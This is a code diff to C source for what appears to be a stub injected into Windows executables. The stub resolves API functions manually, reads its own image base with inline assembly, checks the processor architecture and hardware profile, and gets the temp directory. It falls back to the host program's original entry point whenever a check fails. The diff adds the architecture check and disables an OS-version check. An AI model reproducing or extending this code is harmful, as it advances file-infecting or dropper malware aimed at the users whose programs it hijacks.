@@ -79,22 +79,23 @@ XREFNAMES data_imports[] = {
 			"VirtualQuery",			// 27
 			"VerifyVersionInfoA",	// 28
 			"GetVersionExA",		// 29
+			"GetSystemInfo",		// 30
 			NULL
 	}
 	}, // KERNEL32.DLL
 	
 	{ "MSVCRT.DLL",
 	{
-		"sprintf",				// 30
-		"exit",					// 31
-		"_exit",				// 32
+		"sprintf",				// 31
+		"exit",					// 32
+		"_exit",				// 33
 		NULL
 	} 
 	}, // USER32.DLL
 	
 	{ "ADVAPI32.DLL",
 	{
-		"GetCurrentHwProfileA", // 33
+		"GetCurrentHwProfileA", // 34
 	}
 	}, // ADVAPI32.DLL
 
@@ -330,6 +331,7 @@ NEXT_ENTRY:
 	VERIFYVERSIONINFO pfn_VerifyVersionInfo = (VERIFYVERSIONINFO) dll_calls[CALL_VERIFYVERSIONINFO];
 	GETVERSIONEX pfn_GetVersionEx = (GETVERSIONEX) dll_calls[CALL_GETVERSIONEX];
 	GETCURRENTHWPROFILE pfn_GetCurrentHwProfile = (GETCURRENTHWPROFILE) dll_calls[CALL_GETCURRENTHWPROFILE];
+	GETSYSTEMINFO pfn_GetSystemInfo = (GETSYSTEMINFO) dll_calls[CALL_GETSYSTEMINFO];
 	
 	DWORD imageBase = 0;
 	__asm {
@@ -353,42 +355,66 @@ NEXT_ENTRY:
 	//
 	// *** verify essential calls (optional calls should be verified before each use) ***
 	//
-	CHECK_CALL( pfn_GetVersionEx );
 	CHECK_CALL( pfn_VirtualAlloc );
 	CHECK_CALL( pfn_VirtualFree );
 	CHECK_CALL( pfn_GetEnvironmentVariable );
 	CHECK_CALL( pfn_VirtualQuery );
 	CHECK_CALL( pfn_VirtualProtect );
+	CHECK_CALL( pfn_GetSystemInfo );
+	CHECK_CALL( pfn_GetVersionEx );
+	
+	//
+	// *** check for 64bit system
+	//
+#ifndef _64BIT
+	SYSTEM_INFO* sysInfo = (SYSTEM_INFO*) pfn_VirtualAlloc(NULL, sizeof(SYSTEM_INFO), MEM_COMMIT, PAGE_READWRITE);
+	if (NULL == sysInfo)
+		goto OEP_CALL;
+
+	pfn_GetSystemInfo(sysInfo);
+	if (sysInfo->wProcessorArchitecture != PROCESSOR_ARCHITECTURE_INTEL) {
+		pfn_VirtualFree(sysInfo, 0, MEM_RELEASE);	
+		goto OEP_CALL;
+	}
+#endif
 	
 	//
 	// *** check OS version
 	//
+#if 0
 	OSVERSIONINFOA* osVersion = (OSVERSIONINFOA*) pfn_VirtualAlloc(NULL, sizeof(OSVERSIONINFOA), MEM_COMMIT, PAGE_READWRITE);
-	if (NULL == osVersion)
+	if (NULL == osVersion) {
+		pfn_VirtualFree(osVersion, 0, MEM_RELEASE);
 		goto OEP_CALL;
+	}
 	
 	_MEMSET_(osVersion, 0, sizeof(OSVERSIONINFOA));
 	osVersion->dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);
 	
 	BOOL bVersion = pfn_GetVersionEx(osVersion);
-	if ( FALSE == bVersion)
+	if ( FALSE == bVersion) {
+		pfn_VirtualFree(osVersion, 0, MEM_RELEASE);
 		goto OEP_CALL;
+	}
 	
 	MESSAGE1(STRIDX_SYSMAJORVER, osVersion->dwMajorVersion);
 	MESSAGE1(STRIDX_SYSMINORVER, osVersion->dwMinorVersion);
 	
 	// Verify we are not running on Windows 7 or later
-	//if (osVersion->dwMajorVersion >= 6 && osVersion->dwMinorVersion >= 2)
+	//if (osVersion->dwMajorVersion >= 6 && osVersion->dwMinorVersion >= 2) {
+	//  pfn_VirtualFree(osVersion, 0, MEM_RELEASE);
 	//	goto OEP_CALL;
+	}
 	
 	pfn_VirtualFree(osVersion, 0, MEM_RELEASE);
+#endif
 	
 	// Get user temporary directory
 	char * lpTmpEnvVar = STRING(STRIDX_TMP_ENVVAR);
 	char * lpTmpDir = (char*) pfn_VirtualAlloc(NULL, MAX_PATH, MEM_COMMIT, PAGE_READWRITE);
 	if ( NULL == lpTmpDir )
 		goto OEP_CALL;
-
+	
 	_ZEROMEM_(lpTmpDir, MAX_PATH);
 	DWORD dwRet = pfn_GetEnvironmentVariable(lpTmpEnvVar, lpTmpDir, MAX_PATH);
 	if (dwRet == 0) {
